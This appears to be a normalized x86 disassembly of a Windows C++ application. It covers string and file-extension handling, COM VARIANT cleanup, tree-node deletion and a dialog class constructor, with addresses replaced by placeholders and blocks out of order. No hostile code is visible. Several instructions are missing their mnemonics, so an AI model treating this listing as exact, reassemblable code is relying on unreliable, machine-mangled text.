push eax
call [ _wtol@IAT ]
add esp 0x4
lea ecx [ esp + 0x28 ]
push ecx
mov [ ebx + 0x1c ] eax
call sub_402d40
mov [ esp + 0x678 ] 0xd
lea edx [ esp + 0x20 ]
push edx
call sub_402d40
mov [ esp + 0x678 ] 0xe
mov eax [ esp + 0x10 ]
push r--data
push eax
lea edi [ esp + 0x30 ]
call sub_40be00
mov ecx [ esp + 0x10 ]
push r--data
push ecx
lea edi [ esp + 0x28 ]
call sub_40be00
push 0x206
lea eax [ esp + 0x25a ]
xor edx edx
push esi
push eax
mov [ esp + 0x260 ] dx
call memset
mov edx [ rw-data ]
add esp 0xc
push esi
push esi
push esi
mov esi 0x104
push esi
lea ecx [ esp + 0x264 ]
push ecx
push 0x0
push edx
call [ Ordinal_crt_33@IAT ]
mov eax [ esp + 0x3c ]
mov eax [ eax - 0xc ]
add esp 0x1c
test eax eax
jne r-xdata
mov [ esp + 0x678 ] 0x9
lea ecx [ esp + 0x10 ]
push ecx
call sub_40a500
mov [ esp + 0x678 ] 0x7
lea edx [ esp + 0x18 ]
push edx
call sub_40a500
mov [ esp + 0x678 ] 0x6
push edi
mov ecx [ esp + 0x670 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x658 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebx + 0x10 ]
lea eax [ esp + 0x20 ]
call sub_401760
lea eax [ esp + 0x254 ]
push eax
push edi
call sub_4017d0
mov edi [ esp + 0x2c ]
mov eax [ edi ]
push eax
call [ PathFindExtensionW@IAT ]
push r--data
push eax
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebx + 0x20 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
mov eax [ eax - 0x8 ]
sub eax esi
or eax ecx
jge r-xdata
mov ecx [ edi ]
push eax
push ecx
push r--data
lea edi [ ebx + 0x18 ]
call sub_401dc0
add esp 0xc
mov eax [ ebx + 0x10 ]
lea edi [ ebx + 0x10 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
mov eax [ eax - 0x8 ]
sub eax esi
or eax ecx
jge r-xdata
mov eax [ edi ]
lea edx [ esp + 0x45c ]
sub edx eax
mov eax [ ebx + 0x20 ]
cmp [ eax - 0x8 ] esi
jge r-xdata
mov eax esi
lea ecx [ ebx + 0x20 ]
call sub_402c40
mov eax [ edi ]
cmp [ eax - 0x8 ] esi
jge r-xdata
mov eax esi
mov ecx edi
call sub_402c40
movzx ecx [ eax ]
mov [ eax + edx ] cx
add eax 0x2
test cx cx
jne r-xdata
lea ecx [ esp + 0x45c ]
push 0x2e
push ecx
call [ wcsrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
push 0x0
mov [ eax - 0xc ] esi
mov edx [ ebx + 0x20 ]
push 0x1
xor ecx ecx
push 0x10
mov [ edx + 0x208 ] cx
mov edx [ esp + 0x38 ]
mov ecx [ edx ]
push esi
push eax
push ecx
call [ Ordinal_crt_34@IAT ]
mov eax [ ebx + 0x20 ]
mov ecx [ eax - 0x8 ]
add esp 0x18
test eax eax
je r-xdata
push 0x80070057
call sub_402d00
push 0x0
push 0x1
push 0x10
push esi
push eax
mov [ eax - 0xc ] esi
push 0x0
push 0x80070057
call sub_402d00
mov eax [ ebx + 0x10 ]
lea edi [ ebx + 0x10 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
mov eax [ eax - 0x8 ]
sub eax esi
or eax ecx
jge r-xdata
xor edx edx
mov [ eax ] dx
mov ecx [ ebx + 0x20 ]
cmp eax [ ecx - 0x8 ]
jg r-xdata
push ecx
push eax
call [ wcsnlen@IAT ]
add esp 0x8
test eax eax
js r-xdata
mov ecx [ edi ]
cmp eax [ ecx - 0x8 ]
jg r-xdata
push ecx
push eax
call [ wcsnlen@IAT ]
add esp 0x8
test eax eax
js r-xdata
mov eax [ edi ]
cmp [ eax - 0x8 ] esi
jge r-xdata
mov eax esi
mov ecx edi
call sub_402c40
push 0x80070057
call sub_402d00
mov [ ecx - 0xc ] eax
mov ecx [ ebx + 0x20 ]
xor edx edx
mov [ ecx + eax * 2 ] dx
mov eax [ esp + 0x38 ]
mov ecx [ eax ]
cmp [ ecx - 0xc ] edx
jne r-xdata
mov [ ecx - 0xc ] eax
mov ecx [ edi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
jmp r-xdata
push 0x0
push 0x1
push 0x10
push esi
push eax
mov [ eax - 0xc ] esi
lea eax [ esp + 0x470 ]
push eax
jmp r-xdata
mov [ esp + 0x678 ] 0xd
lea ecx [ esp + 0x20 ]
call sub_402ca0
mov [ esp + 0x678 ] 0xc
lea ecx [ esp + 0x28 ]
call sub_402ca0
mov [ esp + 0x678 ] 0xb
lea ecx [ esp + 0x24 ]
call sub_402ca0
mov [ esp + 0x678 ] 0x9
lea eax [ esp + 0x10 ]
push eax
call sub_40a500
mov [ esp + 0x678 ] 0x7
lea ecx [ esp + 0x18 ]
push ecx
call sub_40a500
mov [ esp + 0x678 ] 0x6
mov edx [ esp + 0x30 ]
push edx
jmp r-xdata
mov [ esp + 0x678 ] 0xd
lea ecx [ esp + 0x20 ]
call sub_402ca0
mov [ esp + 0x678 ] 0xc
lea ecx [ esp + 0x28 ]
call sub_402ca0
mov [ esp + 0x678 ] 0xb
lea ecx [ esp + 0x24 ]
call sub_402ca0
mov [ esp + 0x678 ] 0x9
lea edx [ esp + 0x10 ]
push edx
call sub_40a500
mov [ esp + 0x678 ] 0x7
lea eax [ esp + 0x18 ]
push eax
call sub_40a500
mov [ esp + 0x678 ] 0x6
mov ecx [ esp + 0x30 ]
push ecx
call [ SysFreeString@IAT ]
mov [ esp + 0x678 ] 0x1
lea ecx [ esp + 0x1c ]
call sub_402ca0
mov [ esp + 0x678 ] 0xffffffff
lea edx [ esp + 0x14 ]
push edx
call sub_40a500
jmp r-xdata
mov eax [ esp + 0x28 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov ecx [ edi ]
xor edx edx
mov [ ecx + 0x208 ] dx
call [ Ordinal_crt_34@IAT ]
mov eax [ edi ]
mov ecx [ eax - 0x8 ]
add esp 0x18
test eax eax
je r-xdata
call [ SysFreeString@IAT ]
mov [ esp + 0x678 ] 0x1
lea ecx [ esp + 0x1c ]
call sub_402ca0
mov [ esp + 0x678 ] 0xffffffff
lea eax [ esp + 0x14 ]
push eax
call sub_40a500
mov eax 0x1
jmp r-xdata
sub_40be00
push ebp
mov ebp esp
push 0xffffffff
push sub_44a5d2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi 0x80004005
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
call [ VariantInit@IAT ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x20 ]
lea ecx [ ebp - 0x20 ]
push ecx
push eax
call edx
mov esi eax
test esi esi
js r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x8
jne r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x20 ]
push eax
call [ VariantClear@IAT ]
mov [ ebp + 0x8 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov edx [ ebp - 0x18 ]
call sub_4029c0
sub_40bef0
push ebp
mov ebp esp
push 0xffffffff
push sub_446f32
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea edi [ ebp - 0x10 ]
call sub_40c2f0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40bf60
push ebp
mov ebp esp
push 0xffffffff
push sub_44b119
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov [ ebp - 0x4 ] esi
push 0x18
mov [ ebp - 0x2c ] esi
call [ operator new@IAT ]
add esp 0x4
cmp eax esi
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x10 ] esi
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x24 ] r--data
mov [ ebp - 0x4 ] 0x0
push r--data
lea edx [ ebp - 0x24 ]
push edx
call _CxxThrowException
mov [ ebp - 0x30 ] eax
mov [ eax ] eax
mov eax [ ebp - 0x30 ]
mov [ eax + 0x4 ] eax
mov eax [ ebp - 0x30 ]
mov [ eax + 0x8 ] eax
mov ecx [ ebp - 0x30 ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ ebp - 0x30 ]
mov [ edx + 0x15 ] al
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x20 ]
push eax
mov ecx r--data
call sub_402a00
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx r--data
call sub_402a00
mov [ ebp - 0x4 ] 0x8
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x34 ]
call sub_4021c0
push eax
lea edx [ ebp - 0x34 ]
push edx
lea edi [ ebp - 0x18 ]
call sub_401e60
mov al 0xa
mov [ ebp - 0x4 ] al
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] al
mov eax [ ebp - 0x1c ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x20 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx r--data
call sub_402a00
mov [ ebp - 0x4 ] 0xe
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x14 ]
add eax 0xfffffff0
mov [ ebp - 0x10 ] edx
call sub_4025f0
add eax 0x10
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x12
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x34 ]
call sub_4021c0
push eax
lea eax [ ebp - 0x34 ]
push eax
lea edi [ ebp - 0x20 ]
call sub_401e60
mov al 0x14
mov [ ebp - 0x4 ] al
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] al
mov eax [ ebp - 0x14 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x18 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x19
mov ecx [ rw-data ]
mov edx [ ecx + 0x1c ]
push edx
push r--data
lea edi [ ebp - 0x10 ]
call sub_401dc0
add esp 0x8
lea eax [ ebp - 0x20 ]
push eax
mov ecx r--data
call sub_402a00
mov [ ebp - 0x4 ] 0x1a
mov esi [ ebp - 0x10 ]
lea ecx [ ebp - 0x1c ]
add esi 0xfffffff0
mov eax esi
mov [ ebp - 0x14 ] ecx
call sub_4025f0
add eax 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x1e
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x34 ]
call sub_4021c0
push eax
lea edx [ ebp - 0x34 ]
push edx
lea edi [ ebp - 0x18 ]
call sub_401e60
mov al 0x20
mov [ ebp - 0x4 ] al
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] al
mov eax [ ebp - 0x1c ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0x19
mov eax [ ebp - 0x20 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
cmp [ ebp + 0xc ] 0x0
lea eax [ ebp - 0x34 ]
sete cl
movzx edx cl
push edx
push eax
call sub_401090
mov [ ebp - 0x4 ] 0x4
lea ecx [ esi + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0x26
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
push eax
push ecx
lea edi [ ebp - 0x14 ]
lea esi [ ebp - 0x34 ]
call sub_40c2f0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x30 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ esi ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push esi
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_40c270
push ebp
mov ebp esp
push 0xffffffff
push sub_446ef8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea edi [ ebp - 0x10 ]
call sub_40c2f0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40c2f0
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov [ edi ] ecx
mov eax edi
mov esp ebp
pop ebp
retn 0x8
jmp r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_40c6a0
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov edx [ ecx ]
mov [ edi ] edx
mov eax edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
push edx
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_40c3b0
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_40c3b0
push ebp
mov ebp esp
push 0xffffffff
push sub_446ecd
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x10 ]
cmp [ ebx + 0x15 ] 0x0
je r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] ebx
call sub_42a030
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call [ std::_Xout_of_range@IAT ]
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x14 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x10 ]
mov ebx 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov esi [ ebp - 0x10 ]
add esi 0xc
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
lea eax [ esi + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] bl
mov eax [ eax ]
sub eax 0x10
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_413960
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
lea ecx [ ecx ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
call [ operator delete@IAT ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_421c70
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_421c10
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
je r-xdata
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_421c70
mov eax [ ecx + 0x8 ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_421c10
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_421c10
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_421c70
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_40c6a0
push ebp
mov ebp esp
push 0xffffffff
push sub_44638d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x15 ] 0x0
mov esi ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x10 ]
push eax
call sub_40c6a0
mov esi [ esi ]
lea edi [ ebx + 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] 0x1
lea eax [ edi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ edi ]
sub edi 0x10
lea ecx [ edi + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push ebx
call [ operator delete@IAT ]
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
mov ecx [ edi ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push edi
call edx
sub_40c770
push ebp
mov ebp esp
push 0xffffffff
push sub_44955f
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_4121f0
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x2d0 ]
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ esi + 0x2b4 ] r--data
mov [ esi + 0x2b8 ] r--data
mov [ ebp - 0x10 ] eax
mov [ eax ] 0x0
mov [ ebp - 0x4 ] 0x2
mov eax [ rw-data ]
mov [ esi + 0x220 ] r--data
mov ecx [ eax + 0x4 ]
mov edi [ esi + 0x248 ]
lea ebx [ esi + 0x248 ]
lea eax [ ecx - 0x10 ]
sub edi 0x10
mov [ rw-data ] esi
cmp eax edi
je r-xdata
mov edx [ rw-data ]
push 0x6b
push edx
call [ LoadIconW@IAT ]
mov edi [ Ordinal_crt_94@IAT ]
and [ esi + 0x228 ] 0xfffeffff
mov [ esi + 0x244 ] eax
xor eax eax
push 0x1
push 0x466
mov [ esi + 0x2e0 ] eax
mov [ esi + 0x2dc ] 0x1
mov [ esi + 0x2d8 ] eax
mov [ esi + 0x2e4 ] eax
mov [ esi + 0x2e8 ] eax
mov [ esi + 0x2ec ] al
mov [ esi + 0x2f0 ] eax
mov [ esi + 0x24c ] al
call edi
push 0x1
push 0x467
call edi
add esp 0x10
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ edi + 0xc ] 0x0
jl r-xdata
push ecx
push ebx
mov ebx [ ecx - 0xc ]
call sub_402910
mov edx [ eax ]
cmp edx [ edi ]
jne r-xdata
call sub_4025f0
mov [ ebp - 0x10 ] eax
lea eax [ edi + 0xc ]
or ecx 0xffffffff
[ eax ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x10
mov [ ebx ] ecx
jmp r-xdata
mov ecx [ edi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push edi
call eax
sub_40c900
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40c930
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_40c930
push ebp
mov ebp esp
push 0xffffffff
push sub_44951f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ esi + 0x2b4 ] r--data
mov [ esi + 0x2b8 ] r--data
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ rw-data ] ecx
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x2d0 ]
